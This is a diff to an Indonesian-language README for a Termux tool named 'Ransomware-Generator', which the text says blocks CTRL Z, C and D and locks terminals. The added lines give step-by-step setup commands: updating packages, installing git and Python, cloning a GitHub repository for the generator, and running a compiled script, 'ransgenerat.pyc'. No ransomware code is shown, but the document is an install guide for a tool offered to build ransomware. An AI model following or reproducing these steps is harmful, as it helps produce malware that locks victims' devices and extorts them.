@@ -13,5 +13,22 @@ Ransomware Akan Melakukan Pemblokiran Fungsi CTRL Z, C, Dan D. Semua Terminal Ti
 
 ```bash
 pkg update && pkg upgrade -y
+```
+```
 pkg install python xdg-utils -y
+```
+```
+pkg install git
+```
+```
+git clone https://github.com/Arby-Hex/Ransomware-Generator
+cd Ransomware-Generator
+```
+```
 pip install colorama
+```
+> Jalankan Tool Dengan Command Ini
+```
+python ransgenerat.pyc
+```
+
